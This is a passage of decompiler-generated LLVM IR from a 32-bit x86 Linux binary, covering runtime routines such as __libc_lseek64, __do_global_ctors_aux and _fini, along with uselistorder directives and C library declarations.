  store i32 %v4_804fe54, i32* %v2_804fe62, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v0_804fe66 = load i32, i32* @edx, align 4
  %v1_804fe66 = load i32, i32* @ebx, align 4
  %v2_804fe66 = add i32 %v1_804fe66, 4
  %v3_804fe66 = inttoptr i32 %v2_804fe66 to i32*
  store i32 %v0_804fe66, i32* %v3_804fe66, align 4
  %v0_804fe6a.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_804fe69

dec_label_pc_804fe69:                             ; preds = %entry, %dec_label_pc_804fe62
  %v0_804fe6a = phi i32 [ %v4_804fe54, %entry ], [ %v0_804fe6a.pre, %dec_label_pc_804fe62 ]
  ret i32 %v0_804fe6a

; uselistorder directives
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder i32 4, { 73, 74, 75, 76, 77, 78, 6, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 50, 89, 137, 138, 90, 139, 140, 57, 91, 7, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 30, 31, 71, 58, 109, 110, 111, 244, 147, 148, 149, 143, 141, 142, 144, 145, 146, 0, 8, 150, 151, 152, 153, 154, 155, 156, 157, 158, 32, 51, 112, 113, 114, 33, 34, 35, 159, 45, 1, 245, 134, 9, 10, 160, 161, 52, 162, 163, 164, 165, 166, 167, 168, 169, 170, 53, 171, 172, 173, 174, 59, 36, 175, 176, 177, 178, 37, 38, 39, 60, 40, 41, 61, 42, 179, 43, 180, 62, 44, 63, 64, 11, 246, 247, 249, 250, 254, 255, 256, 248, 46, 70, 12, 115, 116, 117, 118, 65, 185, 186, 187, 54, 181, 182, 183, 184, 119, 120, 121, 122, 123, 55, 13, 124, 125, 251, 253, 196, 197, 198, 199, 200, 201, 14, 202, 203, 204, 205, 206, 207, 208, 209, 194, 195, 210, 48, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 28, 231, 232, 49, 233, 15, 126, 252, 127, 128, 188, 189, 47, 190, 191, 192, 193, 2, 16, 3, 129, 130, 131, 17, 132, 18, 29, 19, 20, 21, 22, 133, 23, 135, 56, 136, 24, 25, 26, 234, 27, 66, 67, 69, 235, 68, 236, 237, 238, 239, 240, 241, 242, 4, 5, 243, 72 }
  uselistorder label %dec_label_pc_804fe69, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804fe72 = load i32, i32* @ebx, align 4
  store i32 %v0_804fe72, i32* %stack_var_-12, align 4
  %v2_804fe7a = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804fe7a, i32* %esi.global-to-local, align 4
  %v1_804fe94 = call i32 @int80_syscall(i32 140)
  store i32 %v1_804fe94, i32* %esi.global-to-local, align 4
  %tmp16 = icmp ult i32 %v1_804fe94, -4095
  br i1 %tmp16, label %dec_label_pc_804feae, label %dec_label_pc_804fea0

dec_label_pc_804fea0:                             ; preds = %entry
  %v1_804fea0 = call i32 @__errno_location(i32 %arg3)
  %v0_804fea5 = load i32, i32* %esi.global-to-local, align 4
  %v1_804fea5 = sub i32 0, %v0_804fea5
  %v2_804fea7 = inttoptr i32 %v1_804fea0 to i32*
  store i32 %v1_804fea5, i32* %v2_804fea7, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804feb2

dec_label_pc_804feae:                             ; preds = %entry
  %v1_804feae = icmp eq i32 %v1_804fe94, 0
  br i1 %v1_804feae, label %dec_label_pc_804feb7, label %dec_label_pc_804feb2

dec_label_pc_804feb2:                             ; preds = %dec_label_pc_804feae, %dec_label_pc_804fea0
  %v0_804feb2 = phi i32 [ %v1_804fe94, %dec_label_pc_804feae ], [ -1, %dec_label_pc_804fea0 ]
  %v1_804feb4 = ashr i32 %v0_804feb2, 31
  br label %dec_label_pc_804febf

dec_label_pc_804feb7:                             ; preds = %dec_label_pc_804feae
  %v3_804feb7 = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_804febf

dec_label_pc_804febf:                             ; preds = %dec_label_pc_804feb2, %dec_label_pc_804feb7
  %v0_804fec5 = phi i32 [ %v0_804feb2, %dec_label_pc_804feb2 ], [ %v3_804feb7, %dec_label_pc_804feb7 ]
  %storemerge = phi i32 [ %v1_804feb4, %dec_label_pc_804feb2 ], [ %tmp, %dec_label_pc_804feb7 ]
  store i32 %storemerge, i32* @edx, align 4
  %v2_804fec2 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fec2, i32* @ebx, align 4
  ret i32 %v0_804fec5

; uselistorder directives
  uselistorder i32 %v1_804fe94, { 1, 2, 0, 3 }
  uselistorder i32* @edx, { 14, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 87, 30, 31, 32, 3, 88, 89, 90, 91, 92, 93, 33, 94, 95, 4, 96, 97, 98, 99, 34, 35, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 13, 53, 54, 36, 55, 5, 56, 57, 59, 6, 60, 61, 62, 63, 64, 17, 7, 58, 205, 206, 207, 208, 8, 209, 210, 100, 101, 104, 102, 103, 105, 106, 107, 108, 109, 110, 111, 65, 69, 66, 67, 68, 112, 113, 114, 115, 116, 117, 118, 125, 119, 120, 121, 122, 123, 124, 0, 15, 82, 126, 127, 128, 129, 212, 130, 131, 132, 136, 133, 134, 135, 137, 138, 139, 140, 200, 9, 1, 16, 83, 141, 214, 145, 215, 146, 70, 71, 72, 73, 199, 216, 217, 222, 221, 84, 74, 149, 150, 10, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 11, 164, 165, 147, 148, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 12, 191, 192, 193, 194, 195, 218, 75, 142, 143, 144, 81, 76, 77, 211, 223, 213, 196, 78, 219, 220, 79, 80, 85, 86, 197, 198, 201, 2, 202, 203, 204, 224 }
  uselistorder i32 31, { 9, 10, 11, 12, 13, 14, 15, 20, 21, 7, 6, 22, 16, 17, 18, 2, 3, 0, 1, 8, 4, 5, 19 }
  uselistorder i32 (i32)* @__errno_location, { 61, 60, 59, 29, 58, 28, 57, 56, 55, 54, 20, 40, 26, 25, 53, 39, 19, 38, 37, 36, 32, 31, 35, 47, 18, 17, 16, 15, 30, 14, 52, 13, 12, 11, 51, 10, 23, 8, 9, 42, 41, 50, 49, 48, 27, 1, 46, 34, 21, 45, 4, 22, 44, 7, 3, 2, 0, 33, 43, 6, 5, 24 }
  uselistorder i32 140, { 1, 0 }
  uselistorder label %dec_label_pc_804febf, { 1, 0 }
}

define i32 @__do_global_ctors_aux() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_804fedc = load i32, i32* @global_var_8052000.69, align 8192
  %v10_804fee1 = icmp eq i32 %v0_804fedc, -1
  br i1 %v10_804fee1, label %dec_label_pc_804fefc, label %dec_label_pc_804fef0.preheader

dec_label_pc_804fef0.preheader:                   ; preds = %entry
  br label %dec_label_pc_804fef0

dec_label_pc_804fef0:                             ; preds = %dec_label_pc_804fef0.preheader, %dec_label_pc_804fef0
  %v4_804fef3 = phi i32 [ %v0_804fedc, %dec_label_pc_804fef0.preheader ], [ %v2_804fef5, %dec_label_pc_804fef0 ]
  %v0_804fef0 = phi i32 [ ptrtoint (i32* @global_var_8052000.69 to i32), %dec_label_pc_804fef0.preheader ], [ %v1_804fef0, %dec_label_pc_804fef0 ]
  %v1_804fef0 = add i32 %v0_804fef0, -4
  call void @__pseudo_call(i32 %v4_804fef3)
  %v1_804fef5 = inttoptr i32 %v1_804fef0 to i32*
  %v2_804fef5 = load i32, i32* %v1_804fef5, align 4
  %v10_804fef7 = icmp eq i32 %v2_804fef5, -1
  %v1_804fefa = icmp eq i1 %v10_804fef7, false
  br i1 %v1_804fefa, label %dec_label_pc_804fef0, label %dec_label_pc_804fefc.loopexit

dec_label_pc_804fefc.loopexit:                    ; preds = %dec_label_pc_804fef0
  %v2_804fefc.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_804fefc

dec_label_pc_804fefc:                             ; preds = %dec_label_pc_804fefc.loopexit, %entry
  %v2_804fefc = phi i32 [ %v2_804fefc.pre, %dec_label_pc_804fefc.loopexit ], [ %tmp6, %entry ]
  ret i32 %v2_804fefc

; uselistorder directives
  uselistorder i32 %v0_804fedc, { 1, 0 }
  uselistorder i1 false, { 416, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 64, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 253, 254, 255, 129, 130, 256, 32, 257, 1, 131, 49, 66, 132, 133, 258, 4, 2, 3, 6, 259, 260, 262, 261, 5, 264, 263, 265, 134, 135, 50, 136, 7, 137, 266, 267, 268, 65, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 158, 157, 159, 160, 161, 162, 163, 165, 30, 166, 164, 167, 169, 168, 8, 170, 171, 173, 172, 51, 174, 175, 176, 177, 178, 67, 179, 180, 75, 76, 181, 77, 78, 182, 183, 79, 184, 185, 68, 80, 186, 187, 188, 189, 190, 69, 191, 70, 81, 71, 192, 72, 193, 194, 195, 73, 196, 74, 197, 82, 198, 199, 200, 86, 87, 417, 418, 46, 276, 33, 34, 271, 275, 273, 274, 52, 269, 270, 272, 277, 278, 279, 280, 281, 201, 203, 204, 205, 206, 202, 207, 208, 211, 47, 209, 48, 210, 282, 283, 289, 35, 284, 285, 287, 286, 290, 291, 296, 295, 292, 293, 294, 9, 0, 419, 10, 227, 228, 229, 53, 297, 298, 299, 302, 300, 301, 11, 36, 303, 305, 304, 54, 306, 308, 307, 55, 309, 310, 420, 56, 421, 12, 311, 312, 313, 314, 315, 316, 317, 348, 323, 37, 13, 318, 319, 320, 321, 322, 324, 325, 38, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 390, 391, 393, 392, 14, 230, 231, 232, 233, 338, 339, 349, 350, 351, 212, 431, 432, 433, 434, 436, 57, 437, 438, 435, 430, 422, 85, 83, 234, 235, 236, 237, 238, 239, 15, 342, 16, 340, 341, 213, 423, 424, 425, 426, 427, 428, 429, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 352, 365, 366, 367, 368, 369, 370, 371, 372, 373, 31, 375, 374, 379, 376, 377, 378, 17, 380, 381, 214, 215, 343, 344, 345, 346, 225, 288, 223, 218, 216, 217, 58, 219, 18, 220, 221, 222, 224, 226, 240, 241, 242, 243, 244, 245, 248, 84, 246, 247, 59, 60, 249, 250, 251, 252, 347, 382, 383, 384, 385, 386, 63, 387, 39, 388, 40, 389, 394, 395, 411, 396, 397, 398, 399, 404, 408, 409, 410, 19, 400, 61, 401, 402, 403, 41, 23, 405, 22, 42, 21, 406, 407, 20, 412, 24, 413, 43, 414, 25, 26, 27, 44, 28, 415, 45, 29, 88, 62, 439 }
  uselistorder void (i32)* @__pseudo_call, { 2, 1, 4, 5, 6, 7, 3, 0 }
  uselistorder i32 -4, { 5, 6, 7, 2, 31, 32, 33, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 34, 35, 36, 37, 41, 42, 43, 44, 3, 45, 0, 40, 46, 47, 48, 49, 50, 51, 4, 39, 1, 38, 52, 29, 30 }
  uselistorder i32 ptrtoint (i32* @global_var_8052000.69 to i32), { 0, 2, 3, 4, 1 }
  uselistorder i32 -1, { 0, 1, 50, 154, 51, 155, 264, 156, 157, 158, 52, 159, 161, 160, 48, 25, 162, 163, 39, 32, 44, 164, 265, 165, 111, 53, 54, 166, 55, 167, 143, 168, 169, 45, 170, 115, 171, 40, 172, 173, 174, 57, 56, 175, 144, 41, 176, 58, 59, 60, 42, 145, 177, 266, 178, 61, 62, 179, 43, 180, 30, 267, 268, 31, 181, 182, 269, 183, 63, 184, 185, 186, 152, 153, 187, 188, 26, 112, 64, 189, 275, 65, 66, 190, 67, 2, 3, 142, 270, 191, 4, 5, 6, 70, 69, 68, 192, 109, 110, 36, 35, 34, 193, 194, 71, 195, 27, 277, 196, 278, 279, 197, 198, 280, 199, 37, 200, 201, 202, 72, 146, 281, 282, 73, 203, 7, 204, 205, 283, 284, 9, 10, 285, 286, 130, 206, 131, 132, 122, 124, 125, 126, 127, 128, 129, 123, 28, 121, 113, 118, 207, 119, 120, 133, 134, 117, 135, 136, 137, 138, 139, 140, 141, 114, 116, 8, 208, 287, 288, 209, 289, 290, 298, 74, 210, 75, 211, 46, 47, 212, 76, 77, 213, 78, 214, 79, 215, 80, 216, 81, 217, 82, 218, 83, 219, 84, 220, 85, 221, 86, 222, 11, 223, 49, 87, 224, 89, 88, 90, 225, 91, 226, 38, 227, 92, 228, 229, 299, 230, 231, 12, 293, 294, 15, 14, 16, 17, 18, 93, 19, 94, 20, 232, 13, 295, 29, 233, 234, 235, 147, 236, 21, 291, 292, 95, 273, 274, 33, 276, 96, 237, 97, 238, 98, 239, 99, 240, 100, 241, 101, 242, 102, 243, 103, 244, 104, 245, 105, 246, 106, 247, 107, 248, 108, 249, 22, 250, 148, 251, 252, 271, 272, 297, 296, 253, 149, 254, 23, 255, 24, 256, 257, 258, 259, 260, 261, 262, 263, 150, 151 }
  uselistorder i32 1, { 351, 353, 352, 69, 62, 229, 230, 58, 60, 59, 61, 266, 0, 355, 354, 112, 113, 356, 37, 577, 357, 32, 33, 293, 578, 579, 580, 231, 292, 358, 581, 582, 583, 232, 584, 585, 370, 369, 368, 367, 366, 365, 364, 363, 362, 361, 360, 359, 174, 175, 171, 167, 173, 166, 168, 170, 169, 172, 586, 587, 1, 17, 16, 15, 14, 13, 371, 176, 177, 372, 149, 148, 658, 373, 93, 588, 589, 374, 91, 90, 92, 233, 375, 30, 590, 376, 82, 79, 81, 77, 78, 80, 267, 268, 379, 378, 377, 659, 215, 571, 660, 211, 661, 83, 662, 234, 663, 664, 150, 665, 666, 591, 592, 349, 380, 68, 593, 381, 382, 269, 667, 339, 178, 594, 595, 572, 236, 596, 597, 598, 599, 600, 602, 603, 604, 237, 605, 606, 325, 235, 607, 238, 608, 609, 610, 601, 386, 385, 384, 383, 21, 23, 22, 18, 19, 20, 24, 611, 387, 164, 161, 163, 162, 239, 388, 612, 613, 390, 389, 26, 25, 614, 615, 573, 574, 270, 616, 271, 617, 618, 619, 240, 620, 294, 621, 393, 392, 391, 72, 76, 74, 73, 75, 241, 295, 2, 296, 394, 821, 822, 823, 395, 41, 40, 42, 39, 398, 397, 396, 12, 399, 400, 160, 242, 243, 668, 216, 212, 669, 321, 670, 671, 672, 289, 673, 3, 340, 147, 146, 674, 675, 402, 401, 180, 179, 181, 676, 403, 677, 404, 182, 678, 679, 405, 184, 183, 185, 622, 623, 624, 625, 626, 627, 628, 629, 630, 409, 408, 407, 341, 406, 342, 119, 118, 120, 121, 631, 632, 412, 411, 410, 343, 344, 156, 152, 154, 151, 153, 155, 272, 680, 681, 208, 265, 682, 683, 244, 684, 290, 686, 687, 413, 44, 273, 691, 688, 689, 690, 217, 416, 415, 414, 159, 158, 419, 418, 417, 43, 420, 692, 421, 38, 645, 646, 647, 245, 648, 693, 694, 695, 422, 202, 201, 203, 204, 291, 696, 697, 698, 699, 246, 71, 297, 298, 299, 700, 423, 300, 301, 701, 247, 4, 425, 424, 186, 302, 426, 96, 427, 95, 94, 824, 429, 428, 187, 188, 274, 825, 430, 189, 303, 206, 304, 702, 703, 704, 705, 706, 707, 708, 709, 710, 434, 433, 432, 431, 106, 305, 711, 712, 306, 307, 713, 436, 435, 437, 190, 438, 97, 308, 439, 209, 714, 715, 213, 716, 248, 218, 717, 718, 719, 720, 721, 722, 723, 249, 442, 441, 440, 724, 725, 726, 727, 728, 729, 730, 731, 5, 732, 250, 733, 734, 735, 251, 736, 737, 252, 738, 739, 740, 741, 742, 309, 350, 444, 443, 56, 55, 57, 275, 276, 794, 795, 796, 797, 219, 649, 650, 651, 445, 31, 743, 744, 745, 447, 446, 36, 35, 34, 448, 826, 449, 48, 47, 49, 450, 89, 451, 102, 452, 70, 453, 66, 455, 454, 122, 456, 191, 457, 104, 458, 192, 459, 193, 460, 194, 461, 463, 462, 67, 464, 105, 466, 465, 165, 467, 471, 470, 469, 468, 139, 827, 828, 829, 473, 472, 50, 51, 830, 277, 475, 474, 477, 476, 195, 278, 326, 570, 310, 478, 652, 653, 654, 655, 479, 110, 109, 111, 107, 108, 279, 480, 45, 46, 746, 575, 214, 747, 327, 748, 345, 481, 116, 115, 114, 117, 482, 127, 124, 123, 125, 129, 128, 126, 134, 131, 133, 135, 130, 132, 311, 484, 483, 312, 485, 313, 486, 314, 488, 487, 328, 491, 490, 489, 196, 315, 754, 755, 756, 492, 103, 757, 758, 220, 759, 760, 761, 138, 136, 137, 329, 753, 253, 197, 198, 200, 199, 316, 762, 763, 764, 765, 766, 767, 768, 769, 770, 254, 771, 772, 773, 774, 775, 282, 776, 777, 207, 283, 778, 779, 780, 781, 280, 281, 782, 783, 784, 495, 494, 493, 86, 85, 84, 88, 87, 284, 285, 496, 286, 287, 255, 500, 499, 498, 497, 144, 330, 501, 502, 503, 504, 505, 749, 6, 750, 317, 227, 318, 751, 7, 510, 509, 508, 507, 506, 63, 64, 511, 512, 641, 642, 514, 513, 54, 53, 52, 685, 515, 517, 516, 29, 518, 145, 520, 519, 28, 521, 101, 522, 142, 524, 523, 99, 525, 141, 526, 205, 528, 527, 100, 529, 157, 531, 530, 140, 532, 98, 143, 633, 221, 322, 228, 634, 8, 9, 210, 635, 636, 637, 638, 639, 640, 288, 256, 331, 319, 332, 538, 537, 536, 535, 534, 533, 346, 333, 643, 644, 540, 539, 656, 657, 576, 541, 65, 752, 544, 543, 542, 785, 786, 545, 323, 334, 257, 787, 788, 552, 551, 550, 549, 548, 547, 546, 789, 790, 10, 335, 791, 258, 259, 792, 793, 555, 554, 553, 347, 798, 799, 556, 559, 558, 557, 800, 801, 336, 809, 810, 226, 811, 560, 320, 11, 562, 561, 260, 802, 223, 803, 804, 261, 805, 222, 807, 808, 262, 337, 338, 806, 348, 812, 563, 813, 814, 27, 815, 816, 263, 817, 818, 819, 224, 565, 564, 264, 820, 324, 225, 566, 568, 567, 569 }
  uselistorder label %dec_label_pc_804fef0, { 1, 0 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v0_804ff07 = load i32, i32* @ebx, align 4
  %v1_804ff08 = call i32 @__get_pc_thunk_bx(i32 %v0_804ff07)
  store i32 %v1_804ff08, i32* @eax, align 4
  %v0_804ff13 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_804ff13

; uselistorder directives
  uselistorder i32* @eax, { 15, 47, 48, 74, 49, 51, 50, 52, 53, 55, 46, 54, 22, 76, 0, 3, 77, 78, 2, 79, 1, 21, 75, 80, 23, 81, 56, 57, 59, 16, 58, 82, 87, 83, 84, 85, 86, 4, 5, 88, 89, 90, 24, 91, 92, 93, 94, 95, 96, 97, 98, 99, 25, 100, 101, 102, 26, 27, 103, 104, 105, 106, 28, 107, 129, 146, 108, 31, 29, 109, 30, 110, 111, 112, 113, 32, 33, 114, 115, 34, 116, 35, 117, 36, 37, 38, 118, 119, 120, 121, 39, 122, 123, 124, 125, 40, 148, 44, 149, 150, 152, 45, 153, 6, 151, 9, 14, 147, 126, 17, 60, 61, 62, 63, 130, 132, 133, 131, 134, 135, 137, 138, 136, 127, 41, 7, 18, 64, 65, 66, 19, 20, 67, 68, 69, 70, 71, 72, 43, 73, 10, 128, 42, 11, 139, 140, 12, 141, 142, 143, 154, 144, 145, 8, 13 }
  uselistorder i32 (i32)* @__get_pc_thunk_bx, { 1, 0 }
  uselistorder i32 0, { 450, 451, 364, 452, 453, 454, 8, 183, 97, 96, 455, 456, 184, 457, 458, 365, 459, 460, 461, 462, 721, 83, 463, 98, 464, 14, 84, 75, 465, 160, 99, 466, 76, 467, 366, 468, 227, 469, 470, 471, 472, 473, 474, 475, 100, 367, 476, 477, 478, 479, 101, 480, 368, 157, 228, 102, 369, 370, 371, 103, 481, 185, 482, 483, 484, 485, 186, 222, 223, 486, 487, 488, 489, 490, 491, 372, 187, 492, 77, 373, 493, 104, 188, 189, 494, 495, 229, 722, 723, 724, 374, 496, 497, 498, 499, 375, 725, 726, 376, 500, 85, 501, 161, 377, 378, 502, 105, 503, 727, 9, 10, 11, 80, 48, 379, 728, 731, 729, 730, 380, 732, 0, 106, 504, 505, 230, 506, 107, 381, 507, 162, 508, 49, 108, 509, 510, 511, 733, 734, 735, 231, 736, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 109, 382, 524, 190, 525, 526, 527, 528, 529, 15, 16, 383, 176, 177, 530, 531, 532, 533, 110, 534, 535, 536, 384, 537, 17, 18, 111, 385, 538, 539, 540, 543, 541, 542, 19, 44, 50, 544, 545, 546, 547, 224, 548, 549, 112, 550, 551, 552, 553, 554, 555, 556, 557, 114, 558, 559, 560, 386, 561, 562, 163, 164, 563, 564, 565, 115, 113, 566, 116, 567, 568, 387, 569, 570, 571, 572, 573, 574, 575, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 117, 388, 389, 118, 588, 589, 590, 390, 391, 591, 592, 593, 594, 595, 596, 597, 598, 392, 393, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 394, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 191, 395, 192, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 193, 640, 641, 642, 643, 644, 645, 646, 20, 51, 52, 53, 54, 647, 648, 649, 650, 651, 652, 119, 653, 396, 654, 655, 656, 657, 343, 658, 659, 660, 661, 662, 663, 120, 397, 81, 41, 72, 576, 165, 73, 917, 918, 919, 920, 921, 922, 923, 924, 1, 166, 664, 926, 210, 746, 739, 740, 741, 21, 42, 742, 743, 744, 398, 745, 88, 89, 90, 737, 738, 121, 747, 748, 750, 751, 749, 752, 194, 753, 754, 755, 756, 757, 758, 123, 124, 399, 232, 233, 665, 400, 666, 122, 667, 668, 669, 670, 671, 672, 57, 58, 673, 674, 675, 357, 676, 56, 401, 55, 402, 125, 126, 403, 12, 404, 677, 13, 405, 127, 234, 406, 407, 128, 408, 761, 409, 759, 175, 760, 235, 236, 129, 130, 43, 410, 762, 763, 764, 765, 766, 237, 411, 412, 195, 927, 928, 131, 767, 22, 59, 708, 78, 79, 413, 768, 60, 414, 23, 132, 769, 61, 415, 770, 416, 772, 771, 167, 417, 418, 773, 775, 774, 168, 419, 776, 929, 930, 169, 932, 931, 62, 238, 420, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 196, 787, 133, 421, 422, 788, 134, 789, 423, 790, 791, 857, 135, 424, 136, 239, 796, 792, 793, 794, 795, 86, 24, 797, 798, 799, 800, 801, 802, 808, 809, 810, 811, 803, 804, 805, 806, 807, 63, 64, 425, 812, 813, 65, 66, 67, 426, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 137, 897, 898, 138, 899, 900, 901, 68, 87, 197, 91, 427, 832, 198, 199, 689, 934, 935, 858, 859, 860, 240, 861, 936, 92, 200, 862, 937, 679, 678, 938, 939, 940, 680, 681, 941, 892, 942, 139, 943, 948, 949, 25, 428, 26, 95, 429, 430, 958, 959, 170, 960, 140, 344, 241, 242, 955, 2, 944, 945, 946, 141, 448, 356, 947, 709, 710, 711, 712, 431, 432, 713, 714, 715, 201, 142, 143, 433, 682, 434, 683, 144, 435, 145, 436, 834, 69, 835, 836, 837, 838, 839, 3, 437, 833, 438, 684, 685, 686, 687, 439, 146, 950, 345, 147, 202, 951, 954, 953, 865, 203, 866, 867, 868, 869, 204, 870, 871, 872, 243, 863, 244, 864, 245, 440, 441, 246, 346, 442, 247, 347, 148, 443, 873, 874, 149, 150, 248, 348, 94, 45, 46, 875, 876, 877, 878, 879, 880, 151, 152, 249, 349, 93, 881, 171, 882, 82, 883, 884, 886, 444, 885, 4, 688, 5, 952, 690, 691, 692, 693, 695, 694, 840, 445, 205, 841, 446, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 902, 47, 925, 153, 696, 961, 893, 697, 933, 962, 963, 887, 853, 698, 956, 957, 158, 252, 350, 159, 27, 154, 206, 250, 358, 699, 155, 207, 251, 700, 253, 351, 701, 254, 352, 211, 702, 353, 703, 255, 704, 225, 705, 706, 707, 256, 208, 28, 29, 716, 359, 360, 257, 717, 719, 258, 259, 718, 172, 720, 361, 178, 262, 260, 261, 354, 355, 263, 854, 855, 856, 209, 362, 264, 888, 179, 180, 181, 182, 266, 889, 265, 267, 212, 890, 891, 268, 894, 895, 896, 363, 213, 269, 271, 215, 270, 214, 216, 30, 272, 273, 274, 275, 276, 912, 31, 32, 74, 33, 219, 220, 903, 904, 905, 906, 173, 217, 218, 221, 907, 908, 909, 910, 34, 35, 36, 911, 226, 37, 38, 913, 70, 39, 40, 71, 277, 278, 6, 447, 7, 914, 915, 916, 156, 449, 174, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 964, 965, 966, 967, 968, 969, 970, 971 }
  uselistorder i32* @ebx, { 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 194, 195, 47, 48, 49, 50, 1, 51, 52, 53, 2, 54, 3, 55, 56, 196, 4, 197, 198, 199, 5, 200, 201, 202, 203, 204, 205, 206, 57, 58, 59, 207, 208, 209, 210, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 211, 212, 213, 214, 6, 215, 7, 216, 217, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 105, 106, 8, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 9, 120, 121, 122, 123, 124, 125, 33, 34, 35, 36, 100, 102, 101, 103, 104, 421, 422, 10, 423, 424, 427, 428, 126, 127, 128, 429, 430, 431, 218, 220, 223, 224, 225, 226, 227, 221, 219, 222, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 249, 11, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 262, 260, 261, 432, 433, 434, 435, 436, 437, 438, 439, 440, 263, 264, 176, 177, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 441, 12, 442, 443, 444, 445, 28, 13, 26, 446, 447, 448, 449, 450, 451, 285, 286, 287, 288, 289, 290, 291, 14, 292, 15, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 356, 357, 17, 314, 305, 303, 304, 306, 309, 307, 308, 310, 311, 312, 16, 313, 315, 316, 317, 318, 319, 320, 321, 18, 322, 19, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 156, 157, 158, 455, 456, 457, 458, 358, 20, 359, 360, 459, 460, 361, 362, 461, 141, 462, 463, 464, 465, 466, 142, 467, 413, 414, 363, 364, 365, 468, 469, 470, 31, 32, 473, 474, 475, 488, 489, 490, 491, 29, 21, 27, 476, 482, 486, 487, 471, 472, 188, 189, 143, 144, 145, 146, 147, 337, 340, 22, 0, 341, 338, 339, 149, 342, 343, 344, 148, 150, 151, 480, 481, 152, 153, 154, 155, 366, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 23, 381, 382, 367, 368, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 30, 394, 395, 396, 397, 398, 24, 399, 400, 401, 402, 403, 404, 405, 406, 407, 478, 479, 159, 160, 161, 345, 346, 347, 348, 349, 350, 25, 351, 352, 353, 425, 426, 162, 163, 164, 492, 493, 415, 416, 165, 166, 167, 452, 453, 454, 494, 495, 496, 497, 408, 409, 354, 355, 168, 169, 170, 477, 483, 484, 485, 171, 172, 173, 174, 175, 190, 191, 192, 193, 410, 411, 412, 498, 499, 500, 501, 417, 418, 419, 420 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

declare i32 @_strlen(i8*) local_unnamed_addr

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i32 @_strncmp(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

